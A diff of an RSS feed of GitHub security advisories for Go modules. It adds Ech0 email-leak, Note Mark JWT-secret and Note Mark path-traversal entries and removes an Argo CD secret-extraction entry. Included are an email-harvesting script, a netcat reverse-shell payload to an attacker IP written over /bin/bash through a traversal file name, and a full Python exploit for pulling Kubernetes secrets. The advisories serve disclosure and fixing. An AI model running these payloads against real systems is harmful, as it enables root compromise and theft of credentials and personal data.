@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-05-07T20:24:42.579Z</updated>
+    <updated>2026-05-07T21:17:46.626Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,243 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lin-snow/Ech0] Ech0 comment model's Email field returned on public /api/comments endpoints]]></title>
+        <id>https://github.com/advisories/GHSA-rj4g-rqgh-rx9h</id>
+        <link href="https://github.com/advisories/GHSA-rj4g-rqgh-rx9h"/>
+        <updated>2026-05-07T21:16:16.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>Comment</code> model serializes its <code>Email</code> field through the public comment-listing API. <code>internal/model/comment/comment.go:33</code> uses <code>json:"email"</code>, while adjacent PII fields (<code>IPHash</code>, <code>UserAgent</code>) correctly use <code>json:"-"</code>. The public endpoints <code>GET /api/comments?echo_id=X</code> and <code>GET /api/comments/public?limit=N</code> both live on <code>PublicRouterGroup</code> with no authentication. Alice retrieves every guest commenter's email address on the instance with a few unauthenticated HTTP calls.</p>
+<h2 id="details">Details</h2>
+<p>The Comment model at <code>internal/model/comment/comment.go:33</code>:</p>
+<pre><code class="language-go">type Comment struct {
+    // ... 
+    Email     string     `gorm:"size:255;not null;index" json:"email"`
+    IPHash    string     `gorm:"size:128;index"          json:"-"`
+    UserAgent string     `gorm:"size:512"                json:"-"`
+    // ...
+}
+</code></pre>
+<p>The <code>json:"-"</code> on <code>IPHash</code> and <code>UserAgent</code> shows the developer's intent: hide server-side PII from API responses. The <code>Email</code> field missed the same tag. GORM materializes the full struct and the Gin handler returns it verbatim.</p>
+<p>Routes at <code>internal/router/comment.go:20</code> and comment public-feed route:</p>
+<pre><code class="language-go">appRouterGroup.PublicRouterGroup.GET("/comments", middleware.NoCache(), h.CommentHandler.ListCommentsByEchoID())
+appRouterGroup.PublicRouterGroup.GET("/comments/public", middleware.NoCache(), h.CommentHandler.ListPublicComments())
+</code></pre>
+<p>Both handlers call <code>ListPublicByEchoID</code> (service at <code>internal/service/comment/comment.go:329</code>) or <code>ListPublicComments</code> (service at <code>:340</code>), both of which return the slice of <code>Comment</code> structs to <code>ctx.JSON</code>. No DTO projection, no field stripping.</p>
+<p>The email field is populated for every guest comment: the submission form requires an email address so the server can later send moderation or reply notifications. The UI does not display the email, so users assume it stays server-side.</p>
+<p>GHSA-m983-7426-5hrj (2026-03-22) closed a similar PII leak on <code>GET /api/allusers</code>, which exposed account-owner emails. This report covers a distinct endpoint (<code>/api/comments</code> and <code>/api/comments/public</code>) and a distinct data subject (guest commenters, not registered account owners).</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Anonymous caller harvests commenter emails on the default install:</p>
+<pre><code class="language-python">import requests
+TARGET = "http://localhost:8300"
+
+# Any echo UUID from the public feed.
+pub_id = requests.get(f"{TARGET}/api/echo/page?page=1&amp;pageSize=1").json()["data"]["items"][0]["id"]
+
+# No auth header. The response includes the raw email field.
+r = requests.get(f"{TARGET}/api/comments", params={"echo_id": pub_id})
+for c in r.json()["data"]:
+    print(f"  nickname={c['nickname']!r}  email={c.get('email')!r}")
+
+# The /public variant returns recent comments across every echo.
+r = requests.get(f"{TARGET}/api/comments/public", params={"limit": 100})
+emails = {c.get("email") for c in r.json()["data"] if c.get("email")}
+print(f"harvested {len(emails)} unique emails from /comments/public")
+</code></pre>
+<p>Observed on v4.5.6:</p>
+<pre><code>nickname='GuestHarvestMe'  email='leaked-harvest-target@example.com'
+harvested 1 unique emails from /comments/public
+</code></pre>
+<p>The instance had one guest comment; its email returned in both endpoints. An instance with any commenter volume returns every address.</p>
+<h2 id="impact">Impact</h2>
+<p>Anonymous harvest of every guest commenter's email address across the instance. Email addresses submitted for moderation or reply notifications are treated as private by user expectation; any visitor pulls the full list with a short paginated loop against <code>/api/comments/public</code>. Privacy-regulation exposure follows:</p>
+<ul>
+<li><strong>GDPR and CCPA.</strong> Email is personal data. Exposing it to any internet visitor without consent is a notifiable incident under both regimes.</li>
+<li><strong>Spam and phishing targeting.</strong> Attackers map commenter emails to nicknames and per-echo topics, then send targeted phishing that references content the victim engaged with.</li>
+<li><strong>Cross-instance aggregation.</strong> A scraper against any public-facing Ech0 instance yields a curated list of people who comment on the topics the site covers.</li>
+</ul>
+<p>No authentication required. No admin role required. The <code>/comments/public</code> endpoint returns cross-echo aggregated data, so one call covers the whole instance.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Change the JSON tag on the Email field to match the adjacent PII fields:</p>
+<pre><code class="language-go">Email string `gorm:"size:255;not null;index" json:"-"`
+</code></pre>
+<p>Or, if some authenticated view needs the email, introduce a <code>PublicComment</code> DTO that projects only non-sensitive fields:</p>
+<pre><code class="language-go">type PublicComment struct {
+    ID        string    `json:"id"`
+    EchoID    string    `json:"echo_id"`
+    Nickname  string    `json:"nickname"`
+    Website   string    `json:"website,omitempty"`
+    Content   string    `json:"content"`
+    Status    string    `json:"status"`
+    Hot       bool      `json:"hot"`
+    Source    string    `json:"source"`
+    CreatedAt int64     `json:"created_at"`
+    UpdatedAt int64     `json:"updated_at"`
+}
+</code></pre>
+<p>Project the handler output through this DTO. Keep the raw <code>Comment</code> struct internal to the service layer.</p>
+<hr>
+<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lin-snow/Ech0/security/advisories/GHSA-rj4g-rqgh-rx9h">https://github.com/lin-snow/Ech0/security/advisories/GHSA-rj4g-rqgh-rx9h</a></li>
+<li><a href="https://github.com/lin-snow/Ech0/commit/cb8d7a997dd8f573ef0e22e4e6b23b2b8ee92ebd">https://github.com/lin-snow/Ech0/commit/cb8d7a997dd8f573ef0e22e4e6b23b2b8ee92ebd</a></li>
+<li><a href="https://github.com/advisories/GHSA-rj4g-rqgh-rx9h">https://github.com/advisories/GHSA-rj4g-rqgh-rx9h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rj4g-rqgh-rx9h</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-07T21:16:15.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/enchant97/note-mark/backend] Note Mark has a JWT Secret Weakness that allows Full Account Takeover via Token Forgery]]></title>
+        <id>https://github.com/advisories/GHSA-q6mh-rqwh-g786</id>
+        <link href="https://github.com/advisories/GHSA-q6mh-rqwh-g786"/>
+        <updated>2026-05-07T21:08:11.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
+<p>No minimum length or entropy is enforced on the <code>JWT_SECRET</code> configuration value. The application accepts any base64-decodable secret regardless of size, including secrets as short as 1 byte.</p>
+<p>HS256 secrets below 32 bytes are brute-forceable offline, allowing attackers to recover the signing key and forge valid JWTs for arbitrary users.</p>
+<hr>
+<h4 id="impact">Impact</h4>
+<p>An attacker who captures a single valid JWT (e.g, from cookies, logs, or network traffic) can:</p>
+<p>&gt; Crack the signing secret offline using brute-force or wordlist attacks
+&gt; Forge valid JWTs for any user ID (including administrators)
+&gt; Authenticate without knowing any credentials</p>
+<p>This results in <strong>full account takeover across the entire application</strong> with no server-side detection or rate limiting possible.</p>
+<hr>
+<h4 id="details">Details</h4>
+<p>In <code>backend/config/utils.go</code>, the <code>Base64Decoded.UnmarshalText</code> function decodes the JWT secret but does not validate its length or entropy.</p>
+<p>In <code>backend/core/auth.go</code>, JWT tokens are signed using HS256 without enforcing minimum key size requirements.</p>
+<p>According to <strong>RFC 7518 Section 3.2</strong>, HS256 keys must be at least 256 bits (32 bytes). Libraries such as PyJWT explicitly warn against shorter keys, but note-mark performs no such validation.</p>
+<hr>
+<h3 id="poc">PoC</h3>
+<p>1- Deploy note-mark with a weak secret:</p>
+<pre><code>JWT_SECRET = base64("testsecret123456789012345")
+</code></pre>
+<p>2- Register an account and capture the <code>Auth-Session-Token</code> cookie</p>
+<p>3- Crack the secret offline (example using Python):</p>
+<pre><code class="language-python">import jwt, base64
+jwt.decode(TOKEN, base64.b64decode(SECRET), algorithms=["HS256"])
+</code></pre>
+<p>4- Forge a new token for any user UUID with extended expiry</p>
+<p>5- Send the forged token in requests → server returns <strong>200 Ok</strong> and authenticates as that user</p>
+<hr>
+<h3 id="reproduction-steps">Reproduction Steps</h3>
+<p>1- Deploy the application with a JWT secret shorter than 32 bytes (after base64 decoding)
+2- Authenticate and capture a valid JWT
+3- Perform offline brute-force or dictionary attack against the token signature
+4- Recover the secret
+5- Generate a forged JWT for another user
+6- Use the forged token to access protected endpoints</p>
+<hr>
+<h3 id="fix-recommendation">Fix Recommendation</h3>
+<ul>
+<li>Enforce a <strong>minimum of 32 bytes (256 bits)</strong> for JWT secrets after base64 decoding</li>
+<li>Reject weak secrets during configuration parsing (e.g., in <code>Base64Decoded.UnmarshalText</code> or config validation)</li>
+<li>Optionally log warnings or fail startup if the secret is insecure</li>
+</ul>
+<hr>
+<h3 id="resources">Resources</h3>
+<ul>
+<li>RFC 7518 Section 3.2 (JSON Web Algorithms - HMAC key size requirements)</li>
+<li>CWE-326: Inadequate Encryption Strength</li>
+<li>CWE-345: Insufficient Verification of Data Authenticity</li>
+</ul>
+<hr>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/enchant97/note-mark/security/advisories/GHSA-q6mh-rqwh-g786">https://github.com/enchant97/note-mark/security/advisories/GHSA-q6mh-rqwh-g786</a></li>
+<li><a href="https://github.com/enchant97/note-mark/commit/18b58775866776ed400c403dd0ccad68c1fa4802">https://github.com/enchant97/note-mark/commit/18b58775866776ed400c403dd0ccad68c1fa4802</a></li>
+<li><a href="https://github.com/enchant97/note-mark/releases/tag/v0.19.4">https://github.com/enchant97/note-mark/releases/tag/v0.19.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-q6mh-rqwh-g786">https://github.com/advisories/GHSA-q6mh-rqwh-g786</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-q6mh-rqwh-g786</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-05-07T21:08:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/enchant97/note-mark/backend] Note Mark: Arbitrary File Write via Path Traversal in Asset Names Leads to Remote Code Execution]]></title>
+        <id>https://github.com/advisories/GHSA-g49p-4qxj-88v3</id>
+        <link href="https://github.com/advisories/GHSA-g49p-4qxj-88v3"/>
+        <updated>2026-05-07T21:06:57.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="description">Description</h3>
+<p>The Note Mark application allows authenticated users to upload assets to notes via <code>POST /api/notes/{noteID}/assets</code>, where the asset filename is provided through the <code>X-Name</code> HTTP request header. This value is stored directly in the database without any sanitization or validation - no path separator filtering, no directory traversal sequence rejection, and no use of <code>filepath.Base()</code> to strip directory components. The unsanitized name is persisted as-is in the <code>note_assets</code> table (<code>Name</code> column, <code>varchar(80)</code>).</p>
+<p>When an administrator subsequently runs the data export CLI commands (<code>note-mark migrate export-v1</code> or <code>note-mark migrate export</code>), the stored asset name is passed directly into <code>filepath.Join()</code> and <code>path.Join()</code> calls as part of the output file path argument to <code>os.Create()</code>. Since Go's <code>filepath.Join()</code> resolves <code>../</code> sequences during path normalization, an attacker-controlled asset name containing directory traversal sequences causes the export process to write files to arbitrary locations on the filesystem, completely outside the intended export directory.</p>
+<p>The export process typically runs as root (the default in Docker deployments and common in bare-metal setups). This means the arbitrary file write operates with root privileges, allowing an attacker to write to any writable location on the filesystem. This can be escalated to Remote Code Execution by overwriting system binaries such as <code>/bin/bash</code> with a malicious payload. Since the Go binary is statically compiled and does not shell out to external programs during the export, overwriting <code>/bin/bash</code> does not affect the running export process. However, the next time any user or administrator invokes <code>bash</code> on the system, the attacker-controlled binary executes instead, resulting in code execution as root. In environments with cron or systemd, writing to <code>/etc/cron.d/</code> or systemd unit files provides additional exploitation paths.</p>
+<p>The data flow is: <code>X-Name</code> HTTP header &gt; <code>handlers/assets.go</code> (no validation) &gt; <code>services/assets.go</code> (stored to DB as-is) &gt; <code>cli/migrate.go</code> (used in <code>os.Create(filepath.Join(..., asset.Name))</code>) &gt; arbitrary file write.</p>
+<h4 id="source-code-analysis">Source Code Analysis</h4>
+<p>The asset upload handler at <code>backend/handlers/assets.go:48-51</code> extracts the filename directly from the <code>X-Name</code> header:</p>
+<pre><code class="language-go">type PostNoteAssetInput struct {
+    NoteID  uuid.UUID `path:"noteID" format:"uuid"`
+    Name    string    `header:"X-Name" required:"true"`
+    RawBody []byte    `required:"true"`
+}
+</code></pre>
+<p>The service layer at <code>backend/services/assets.go:39-42</code> stores this value without validation:</p>
+<pre><code class="language-go">noteAsset := db.NoteAsset{
+    NoteID: noteID,
+    Name:   name,
+}
+</code></pre>
+<p>The V1 export function at <code>backend/cli/migrate.go:328</code> uses the unsanitized name directly:</p>
+<pre><code class="language-go">f, err := os.Create(filepath.Join(noteDir, asset.Name))
+</code></pre>
+<p>The non-V1 export function at <code>backend/cli/migrate.go:223</code> similarly uses it:</p>
+<pre><code class="language-go">f, err := os.Create(path.Join(assetsDir, asset.ID.String()+"."+asset.Name))
+</code></pre>
+<p>In both cases, <code>filepath.Join</code> / <code>path.Join</code> resolves <code>../</code> sequences in <code>asset.Name</code>, causing the resulting path to escape the intended directory.</p>
+<h3 id="steps-to-reproduce">Steps to Reproduce</h3>
+<ol>
+<li><p>Start a Note Mark instance (version 0.19.2 or earlier) using the official Docker image: <code>docker run -d --name notemark -p 8080:8080 -e JWT_SECRET="$(openssl rand -base64 32)" -e PUBLIC_URL="http://localhost:8080" ghcr.io/enchant97/note-mark-aio:0.19.2</code></p>
+</li>
+<li><p>Register a user account: <code>curl -s -X POST http://localhost:8080/api/users -H 'Content-Type: application/json' -d '{"username":"attacker","password":"Attack3r!","name":"attacker"}'</code></p>
+</li>
+<li><p>Authenticate and capture the session cookie: <code>curl -s -D - -X POST http://localhost:8080/api/auth/token -H 'Content-Type: application/json' -d '{"username":"attacker","password":"Attack3r!","grant_type":"password"}'</code>. Save the <code>Auth-Session-Token</code> cookie value from the <code>Set-Cookie</code> response header.</p>
+</li>
+<li><p>Create a notebook: <code>curl -s -X POST http://localhost:8080/api/books -H 'Content-Type: application/json' -b 'Auth-Session-Token=&lt;TOKEN&gt;' -d '{"name":"test","slug":"test"}'</code>. Note the returned <code>id</code> as <code>BOOK_ID</code>.</p>
+</li>
+<li><p>Create a note in the notebook: <code>curl -s -X POST http://localhost:8080/api/books/&lt;BOOK_ID&gt;/notes -H 'Content-Type: application/json' -b 'Auth-Session-Token=&lt;TOKEN&gt;' -d '{"name":"test","slug":"test"}'</code>. Note the returned <code>id</code> as <code>NOTE_ID</code>.</p>
+</li>
+<li><p>Upload an asset with a reverse shell payload in the body and a path traversal filename in the <code>X-Name</code> header targeting <code>/bin/bash</code>: <code>curl -s -X POST http://localhost:8080/api/notes/&lt;NOTE_ID&gt;/assets -b 'Auth-Session-Token=&lt;TOKEN&gt;' -H 'X-Name: ../../../../../../bin/bash' -H 'Content-Type: application/octet-stream' -d '#!/bin/sh\nnc &lt;ATTACKER_IP&gt; &lt;PORT&gt; -e /bin/sh'</code>. Confirm the response contains <code>"name":"../../../../../../bin/bash"</code>, showing the traversal payload was stored without sanitization.</p>
+</li>
+<li><p>Trigger the export as an administrator (simulating the admin running a routine data export): <code>docker exec notemark /note-mark migrate export-v1 --export-dir /data/backup</code></p>
+</li>
+<li><p>Verify <code>/bin/bash</code> was overwritten with the attacker payload: <code>docker exec notemark cat /bin/bash</code>. The file should contain the reverse shell script instead of the original bash binary, confirming arbitrary file write.</p>
+</li>
+<li><p>Start a listener on the attacker machine (<code>nc -lvnp &lt;PORT&gt;</code>), then invoke bash on the target: <code>docker exec notemark bash</code>. A reverse shell connects back to the attacker as root, confirming Remote Code Execution.</p>
+</li>
+</ol>
+<h4 id="proof-of-concept-video">Proof of Concept (Video)</h4>
+<p><a href="https://github.com/user-attachments/assets/6969a00a-3ad1-4e30-b5ce-9e780da4fa2b">note-mark-path-traversal-rce.webm</a></p>
+<h3 id="recommendations">Recommendations</h3>
+<p>The root cause is the complete absence of input validation on the <code>X-Name</code> header value used as the asset filename. The fix should be applied at two layers.</p>
+<p>At the input layer in the asset upload handler, the application should reject any asset name containing path separators (<code>/</code>, <code>\</code>) or directory traversal sequences (<code>..</code>). The simplest approach is to apply <code>filepath.Base()</code> to the incoming name, which strips all directory components and returns only the final filename element. Names that resolve to empty strings or <code>.</code> after this operation should be rejected. This validation should be applied in the <code>PostNoteAsset</code> handler before the name reaches the service layer.</p>
+<p>At the export layer in the CLI migration code, the application should apply <code>filepath.Base()</code> to <code>asset.Name</code> before using it in any file path construction as a defense-in-depth measure. This ensures that even if a malicious name exists in the database (from before the input validation was added), the export process cannot be exploited. Both the V1 export path at <code>migrate.go:328</code> and the standard export path at <code>migrate.go:223</code> require this fix.</p>
+<p>Reported By: Ravindu Wickramasinghe (rvz) - Zyenra Security -  <a href="http://www.zyenra.com">www.zyenra.com</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/enchant97/note-mark/security/advisories/GHSA-g49p-4qxj-88v3">https://github.com/enchant97/note-mark/security/advisories/GHSA-g49p-4qxj-88v3</a></li>
+<li><a href="https://github.com/enchant97/note-mark/releases/tag/v0.19.4">https://github.com/enchant97/note-mark/releases/tag/v0.19.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-g49p-4qxj-88v3">https://github.com/advisories/GHSA-g49p-4qxj-88v3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g49p-4qxj-88v3</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-07T21:06:55.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/sipeed/picoclaw] PicoClaw has an Injection issue in its Web Launcher Management Plane component]]></title>
         <id>https://github.com/advisories/GHSA-6r3x-h84w-fhxx</id>
@@ -1402,532 +1639,5 @@ if __name__ == "__main__":
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-05-07T01:56:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v3] ArgoCD ServerSideDiff is vulnerable to Kubernetes Secret Extraction]]></title>
-        <id>https://github.com/advisories/GHSA-3v3m-wc6v-x4x3</id>
-        <link href="https://github.com/advisories/GHSA-3v3m-wc6v-x4x3"/>
-        <updated>2026-05-07T01:56:55.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>There is a missing authorization and data-masking gap in Argo CD's ServerSideDiff endpoint that allows an attacker with read-only access to extract plaintext Kubernetes Secret data from etcd via the Kubernetes API server's Server-Side Apply dry-run mechanism.</p>
-<h3 id="details">Details</h3>
-<p>Argo CD masks Secret data in every endpoint that returns Kubernetes resource state except one. All the other endpoints such as GetManifests, GetManifestsWithFiles, GetResource and PatchResource utilize hideSecretData() to mask the returned secret value. The vulnerable function ServerSideDiff gRPC/REST endpoint (/application.ApplicationService/ServerSideDiff) constructs its response with raw, unmasked PredictedLive and NormalizedLive states:</p>
-<pre><code>// server/application/application.go:3051-3062
-responseDiffs = append(responseDiffs, &amp;v1alpha1.ResourceDiff{
-    TargetState:     string(diffRes.PredictedLive),
-    LiveState:       string(diffRes.NormalizedLive),
-})
-</code></pre>
-<p>A user only requires RBAC to call this ServerSideDiff function. Every authenticated Argo CD user has get access via the default role:catch-all policy. However, Argo CD has a defense layer called removeWebhookMutation() that normally strips non-Argo CD-managed fields from the Server Side Apply (SSA) dry-run response and merges them with the client-provided (masked) live state. This prevents real Secret values from leaking through the diff. However, this defense is entirely skipped when the Application has the annotation argocd.argoproj.io/compare-options: IncludeMutationWebhook=true.
-When IncludeMutationWebhook=true is set, ignoreMutationWebhook becomes false, and the defense is skipped entirely:</p>
-<pre><code>if o.ignoreMutationWebhook {
-    predictedLive, err = removeWebhookMutation(predictedLive, live, o.gvkParser, o.manager)
-}
-</code></pre>
-<p>The raw Kubernetes SSA dry-run response which contains real Secret values read from etcd is then flown directly into the API response with no masking.</p>
-<p>When ServerSideDiff is called, the handler invokes K8sServerSideDryRunner.Run(), which performs the equivalent of:</p>
-<p><code>kubectl apply --server-side --dry-run=server --field-manager=argocd-controller </code>
-For extraction to succeed, the Secret's data fields must be owned by at least one non-Argo CD SSA field manager. When argocd-controller is the sole field manager for data, the SSA dry-run garbage-collects those fields (since the target manifest omits them). When a second manager exists (e.g., kube-controller-manager), that manager retains ownership and the real values survive in the response.</p>
-<h3 id="poc">PoC</h3>
-<pre><code>#!/usr/bin/env python3
-"""
-Argo CD ServerSideDiff Secret Extraction PoC
-
-Usage:
-    python3 poc.py &lt;host&gt; &lt;token&gt; &lt;app&gt; &lt;project&gt;
-
-Example:
-    python3 poc.py argocd.int.&lt;customer&gt;.com eyJhbG... my-app my-project
-"""
-
-import base64
-import http.client
-import json
-import ssl
-import struct
-import sys
-import urllib.parse
-from collections import defaultdict
-
-def encode_varint(v):
-    out = []
-    while v &gt; 0x7f:
-        out.append((v &amp; 0x7f) | 0x80)
-        v &gt;&gt;= 7
-    out.append(v &amp; 0x7f)
-    return bytes(out)
-
-def encode_str(field, val):
-    tag = (field &lt;&lt; 3) | 2
-    raw = val.encode()
-    return encode_varint(tag) + encode_varint(len(raw)) + raw
-
-def encode_bytes(field, val):
-    tag = (field &lt;&lt; 3) | 2
-    return encode_varint(tag) + encode_varint(len(val)) + val
-
-def encode_bool(field, val):
-    tag = (field &lt;&lt; 3) | 0
-    return encode_varint(tag) + encode_varint(1 if val else 0)
-
-def decode_varint(data, pos):
-    val, shift = 0, 0
-    while pos &lt; len(data):
-        b = data[pos]; pos += 1
-        val |= (b &amp; 0x7f) &lt;&lt; shift; shift += 7
-        if not (b &amp; 0x80):
-            break
-    return val, pos
-
-def decode_fields(data):
-    fields = defaultdict(list)
-    pos = 0
-    while pos &lt; len(data):
-        tag, pos = decode_varint(data, pos)
-        wtype = tag &amp; 0x07
-        if wtype == 0:
-            val, pos = decode_varint(data, pos)
-            fields[tag &gt;&gt; 3].append(val)
-        elif wtype == 2:
-            length, pos = decode_varint(data, pos)
-            fields[tag &gt;&gt; 3].append(data[pos:pos + length])
-            pos += length
-        elif wtype == 5:
-            fields[tag &gt;&gt; 3].append(data[pos:pos + 4]); pos += 4
-        elif wtype == 1:
-            fields[tag &gt;&gt; 3].append(data[pos:pos + 8]); pos += 8
-        else:
-            break
-    return dict(fields)
-
-
-# -- grpc-web framing --
-
-def grpc_frame(payload):
-    return b"\x00" + struct.pack("&gt;I", len(payload)) + payload
-
-def decode_grpc_frames(data):
-    frames, pos = [], 0
-    while pos + 5 &lt;= len(data):
-        flag = data[pos]
-        length = struct.unpack("&gt;I", data[pos+1:pos+5])[0]
-        pos += 5
-        frames.append((flag, data[pos:pos+length]))
-        pos += length
-    return frames
-
-
-# -- http helpers --
-
-def make_conn(host):
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    return http.client.HTTPSConnection(host, 443, context=ctx, timeout=10)
-
-def rest_get(conn, path, token):
-    conn.request("GET", path, headers={
-        "Authorization": "Bearer " + token,
-        "Accept": "application/json",
-    })
-    resp = conn.getresponse()
-    body = resp.read()
-    if resp.status != 200:
-        return None, "HTTP %d" % resp.status
-    return json.loads(body), None
-
-def grpc_post(conn, token, payload):
-    conn.request("POST", "/application.ApplicationService/ServerSideDiff",
-        body=grpc_frame(payload), headers={
-            "Content-Type": "application/grpc-web+proto",
-            "Accept": "application/grpc-web+proto",
-            "X-Grpc-Web": "1",
-            "Authorization": "Bearer " + token,
-        })
-    resp = conn.getresponse()
-    raw = resp.read()
-    if resp.status != 200:
-        return None, "HTTP %d" % resp.status
-    frames = decode_grpc_frames(raw)
-    for flag, fdata in frames:
-        if flag == 0:
-            return fdata, None
-    return None, "no data frame in response"
-
-
-# -- main --
-
-def main():
-    if len(sys.argv) != 5:
-        print("Usage: python3 poc.py &lt;host&gt; &lt;token&gt; &lt;app&gt; &lt;project&gt;")
-        sys.exit(1)
-
-    host, token, app_name, project = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
-    conn = make_conn(host)
-
-    # step 1: list managed resources for the app, find secrets
-    print("[*] Fetching managed resources for %s/%s ..." % (project, app_name))
-    data, err = rest_get(conn, "/api/v1/applications/%s/managed-resources" % urllib.parse.quote(app_name), token)
-    if err:
-        print("[-] Failed: %s" % err); sys.exit(1)
-
-    secrets = []
-    for r in data.get("items", []):
-        if r.get("kind") != "Secret":
-            continue
-        name = r.get("name", "")
-        ns = r.get("namespace", "")
-        live = r.get("liveState", "")
-        stype = "Opaque"
-        if live and live != "null":
-            try:
-                stype = json.loads(live).get("type", "Opaque")
-            except Exception:
-                pass
-        secrets.append((name, ns, stype, live))
-
-    if not secrets:
-        print("[-] No secrets found in managed resources"); sys.exit(0)
-    print("[+] Found %d secrets" % len(secrets))
-
-    # step 2: call ServerSideDiff for each secret
-    total_extracted = 0
-    for sname, sns, stype, live_json in secrets:
-        # build minimal target manifest (no data field)
-        target = {"apiVersion": "v1", "kind": "Secret",
-                  "metadata": {"name": sname, "namespace": sns},
-                  "type": stype}
-
-        # copy required annotations from live state for SA tokens
-        if live_json and live_json != "null":
-            try:
-                live_annots = json.loads(live_json).get("metadata", {}).get("annotations", {})
-                k8s_annots = {k: v for k, v in live_annots.items() if k.startswith("kubernetes.io/")}
-                if k8s_annots:
-                    target["metadata"]["annotations"] = k8s_annots
-            except Exception:
-                pass
-
-        # for TLS secrets, include required placeholder keys
-        if stype == "kubernetes.io/tls":
-            target["data"] = {
-                "tls.crt": base64.b64encode(b"PLACEHOLDER").decode(),
-                "tls.key": base64.b64encode(b"PLACEHOLDER").decode(),
-            }
-        elif stype == "kubernetes.io/dockerconfigjson":
-            target["data"] = {".dockerconfigjson": base64.b64encode(b'{"auths":{}}').decode()}
-
-        # encode the grpc request
-        lr = b""
-        lr += encode_str(2, "Secret")       # kind
-        lr += encode_str(3, sns)             # namespace
-        lr += encode_str(4, sname)           # name
-        if live_json:
-            lr += encode_str(6, live_json)   # liveState
-        lr += encode_bool(12, True)          # modified
-
-        query = encode_str(1, app_name)
-        query += encode_str(3, project)
-        query += encode_bytes(4, lr)
-        query += encode_str(5, json.dumps(target))
-
-        # reconnect for each call (simple, no pool needed for poc)
-        try:
-            conn = make_conn(host)
-            resp_data, err = grpc_post(conn, token, query)
-        except Exception as e:
-            print("  [!] %s/%s: %s" % (sns, sname, e))
-            continue
-        if err:
-            print("  [!] %s/%s: %s" % (sns, sname, err))
-            continue
-
-        # parse response
-        resp_fields = decode_fields(resp_data)
-        for item_bytes in resp_fields.get(1, []):
-            if not isinstance(item_bytes, bytes):
-                continue
-            ifields = decode_fields(item_bytes)
-
-            # field 5 = targetState (predictedLive — has real values from etcd)
-            for raw in ifields.get(5, []):
-                if not isinstance(raw, bytes):
-                    continue
-                try:
-                    obj = json.loads(raw)
-                except Exception:
-                    continue
-                if obj.get("kind") != "Secret":
-                    continue
-                secret_data = obj.get("data", {})
-                if not secret_data:
-                    continue
-
-                # check for real (non-masked) values
-                real_keys = {}
-                for k, v in secret_data.items():
-                    if not v:
-                        continue
-                    if all(c == "+" for c in v):
-                        continue  # masked by argocd
-                    try:
-                        decoded = base64.b64decode(v)
-                        text = decoded.decode("utf-8", errors="replace")
-                    except Exception:
-                        continue
-                    if all(c == "+" for c in text) and text:
-                        continue  # masked (base64 of +++...)
-                    real_keys[k] = text
-
-                if real_keys:
-                    total_extracted += 1
-                    print("\n  [***] %s/%s  (%s)" % (sns, sname, stype))
-                    print("        %d/%d keys extracted:" % (len(real_keys), len(secret_data)))
-                    for k in sorted(real_keys):
-                        v = real_keys[k].replace("\n", "\\n")
-                        if len(v) &gt; 120:
-                            v = v[:120] + "..."
-                        print("          %s: %s" % (k, v))
-
-    print("\n[*] Done. %d secrets with real values extracted." % total_extracted)
-
-if __name__ == "__main__":
-    main()
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Any user with Argo CD application get permissions can extract real Kubernetes Secret values including service account tokens, TLS certificates, database credentials, and API keys. On Applications where IncludeMutationWebhook=true is already set, exploitation requires only read-only Argo CD access.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-3v3m-wc6v-x4x3">https://github.com/argoproj/argo-cd/security/advisories/GHSA-3v3m-wc6v-x4x3</a></li>
-<li><a href="https://github.com/advisories/GHSA-3v3m-wc6v-x4x3">https://github.com/advisories/GHSA-3v3m-wc6v-x4x3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3v3m-wc6v-x4x3</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-07T01:56:53.000Z</published>
-    </entry>
-    <entry>
